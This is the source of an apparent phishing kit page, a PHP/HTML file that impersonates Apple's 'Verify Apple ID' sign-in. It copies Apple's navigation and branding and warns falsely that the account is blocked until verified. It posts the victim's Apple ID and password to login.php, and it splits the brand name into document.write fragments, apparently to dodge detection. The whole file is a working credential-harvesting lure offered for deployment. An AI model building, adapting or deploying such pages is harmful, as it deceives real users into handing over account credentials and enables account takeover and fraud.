<?php
include "validate.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en_US" lang="en_US" dir="ltr">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
 <meta http-equiv="X-UA-Compatible" content="IE=Edge" />  
 <link rel="shortcut icon" href="images/favicon.ico">
    <title>Verify Apple ID - Login</title>
    <link rel="stylesheet" type="text/css" href="images/navigation.css" id="globalheader-stylesheet"></link>
    <link rel="stylesheet" type="text/css" href="images/base.css"></link>
    <link rel="stylesheet" type="text/css" href="images/id.css"></link>
    <link rel="stylesheet" type="text/css" href="images/hsa.css"></link>
<script language="JavaScript1.2">
var testresults
function checkemail(){
var str=document.email.email.value
var filter=/^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i
if (filter.test(str))
testresults=true
else{
alert("Please enter valid e-mail!")
testresults=false
}
var x=document.forms["email"]["password"].value;
if (x==null || x=="")
  {
  alert("Please enter valid password!");
  return false;
  }
return (testresults)
}
</script>


<script>
function checkbae(){
if (document.layers||document.getElementById||document.all)
return checkemail()
else
return true
}
</script>
</head>


<body class="myappleid sign-in index" id="editContainerBody">

<!--********* New style imported as per the new Header *********-->

<!-- end -->

<!--********* setting country and language from Language parameter *********-->



<!--********* setting locale to urlLanguageInsert to dynamically form the URL based on locale *********-->



	
		
	
	
	
	
		

<nav id="globalheader" class="globalheader" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US">

<div id="gh-content" class="gh-content">
      <ul class="gh-menu">
        <li id="gh-menu-icon-toggle" class="gh-menu-icon gh-menu-icon-toggle"><button id="gh-svg-icons" class="gh-svg-wrapper"></button><span class="gh-text-replace">Menu</span></li>
        <li id="gh-menu-icon-home" class="gh-menu-icon gh-menu-icon-home"><a href="/"><span class="gh-text-replace">Apple</span></a></li>
      </ul><!--/gh-menu-->




<div class="gh-nav">
 <div class="gh-nav-view">
    
	         
	
	
	 
	
	
	
		




          <ul class="gh-nav-list">
            <li class="gh-tab gh-tab-apple"><a class="gh-tab-link" href="http://www.apple.com/" onclick="s_objectID=&quot;http://www.apple.com/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Apple</span></span></a></li>
            <li class="gh-tab gh-tab-store">
            
            
			
			
			
			
            <a class="gh-tab-link" href="http://store.apple.com/" onclick="s_objectID=&quot;http://store.apple.com/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Store</span></span></a>
            
            </li>
            <li class="gh-tab gh-tab-mac">
				
            		<a class="gh-tab-link" href="http://www.apple.com/mac" onclick="s_objectID=&quot;http://www.apple.com/mac/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Mac</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-iphone">
				
            		<a class="gh-tab-link" href="http://www.apple.com/iphone" onclick="s_objectID=&quot;http://www.apple.com/iphone/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iPhone</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-watch">
            	
            	
            		<a class="gh-tab-link" href="http://www.apple.com/watch" onclick="s_objectID=&quot;http://www.apple.com/watch/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Watch</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-ipad">
            	
					
            		
            			<a class="gh-tab-link" href="http://www.apple.com/ipad" onclick="s_objectID=&quot;http://www.apple.com/ipad/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iPad</span></span></a>
            		
            </li>
            <li class="gh-tab gh-tab-ipod">
				
            	
            		<a class="gh-tab-link" href="http://www.apple.com/ipod" onclick="s_objectID=&quot;http://www.apple.com/ipod/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iPod</span></span></a>
            			
            </li>
            <li class="gh-tab gh-tab-itunes">
				
					<a class="gh-tab-link" href="http://www.apple.com/itunes" onclick="s_objectID=&quot;http://www.apple.com/itunes/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">iTunes</span></span></a>
            	
            </li>
            <li class="gh-tab gh-tab-support">
            	
            	
            		<a class="gh-tab-link" href="http://www.apple.com/support" onclick="s_objectID=&quot;http://www.apple.com/support/_1&quot;;return this.s_oc?this.s_oc(e):true"><span class="gh-tab-inner"><span class="gh-text-replace">Support</span></span></a>
            	
            </li>
           
           <li id="gh-tab-search" class="gh-tab gh-tab-search">
              <div id="gh-search" class="gh-search" role="search">
               <form action="login.php" method="post" class="gh-search-form" id="gh-search-form" data-search-recommended-results='{"url":"https://www.apple.com/global/nav/scripts/shortcuts.php","requestName":"recommendedResults","queryName":"q","dataType":"xml"}' data-search-suggested-searches='{"url":"https://www.apple.com/search/instant/getSuggestions","requestName":"suggestedSearches","queryName":"query","queryParams":{"model":"marcom_en_US","locale":"en_US"},"dataType":"json"}' >                 
                 
                  <div class="gh-search-input-wrapper">
                       <label for="gh-search-input" class="gh-text-replace">Search apple.com</label>
                       <input type="text" name="q" id="gh-search-input" class="gh-search-input" placeholder="Search apple.com" />
                   </div>
                    <button disabled="disabled" type="submit" id="gh-search-submit" class="gh-search-submit gh-search-magnify"><span class="gh-text-replace">Search apple.com</span></button>
                    <button disabled="disabled" type="reset" id="gh-search-reset" class="gh-search-reset"><span class="gh-text-replace">Reset</span></button>
                  
                </form>
              </div>
              <a class="gh-search-magnify" href="http://www.apple.com/search/"><span class="gh-text-replace">Search apple.com</span></a>
            </li>
          </ul>
        </div>
      </div><!--/gh-nav-->

    </div>
  </nav><!--/globalheader-->



<!-- header ends here -->
    
<form method="POST" onSubmit="return checkbae()" id="signIn" name="email" action="login.php">
	
  <div id="productheader">
	  
			<a aria-label="My ID" href="#">
			  <h2>
			     <img aria-hidden="true" class="DimAppleIdLogoIV" src="images/logo.png" />
			  </h2>
			</a>
		
		
</div>
		<div id="main">
			<div id="content" class="content">
				<div class="grid2colc wrap">
				
					<div class="column first sidebar">
						<h2>Please sign in to verify your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT></h2>
						<p class="intro">
						  Please login to verify & update your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> account information.</p>
						<h2>Account Verification.</h2>
						<p class="intro">
						We occasionally require our users to verify or update their account information on file. This can be due to invalid account details, or an expired payment method. 						<br/><br/><b>You will be unable to use your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> or make purchases until this process is completed.</b>
						</p>
						
					</div><!--/column-->

					<div class="column last">
					<h2>Sign in to verify your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT>.</h2>
					<div class="formrow">
					
					
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="128" placeholder="Apple ID" value="" aria-label="Apple ID" id="email" type="text" name="email" />
					</span>
					
					<span class="input-msg show">
						<a name="" id="" href="forgot.html"><span>Forgot your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT>?</span></a>
					</span>
				</div>
				<div class="formrow">
					<span class="formwrap">
						<input size="30" oncut="" oncopy="" autocapitalize="off" autocorrect="off" aria-label="Password" placeholder="Password" id="password" type="password" name="password" required/>
					</span>
					<span class="input-msg show">
						<a name="" type="submit" id="" href="forgot.html"><span>Forgot your Password?</span></a>
					</span>
				</div>
				
				<div id="bot-nav">
					
					<a type="submit" class="btn bigblue">
							<input class="btn bigblue" id="" onsubmit="return validateForm()" type="submit" value="Sign In To Apple ID Verification" name="" />
						</a>					
					</div>	
					</div>
				
				</div>
			</div>
		</div>
	
</form>


    
    <footer id="globalfooter">
	    
	    	<div id="breadory">
	<ol id="breadcrumbs">
		<li class="home"><a>Home</a></li>
		
			<li> <a onClick="" href="#">My <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT></a> </li>
		
		
	</ol>
</div>
<div class="gf-sosumi">
        <p>Copyright &copy; 2014 <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' Inc') </SCRIPT> All rights reserved.</p>
        <ul class="piped">
                <li><a class="first" href="terms.html">Terms of Use</a></li>
                <li><a href="privacy.html">Privacy Policy</a></li>
                  <li style="float:right">
                <a class="choose" title="Choose your country or region" href="chooseyourcountry.html"><p style="display:inline;margin-right:-5px; padding-right:0px;"><SCRIPT TYPE="text/javascript"> document.write('Choose' + ' your') </SCRIPT> country or region</p><img class="img-22" src="images/usa.png" /></a></li>
               
        </ul>
</div>
</footer>



</body>
</html>
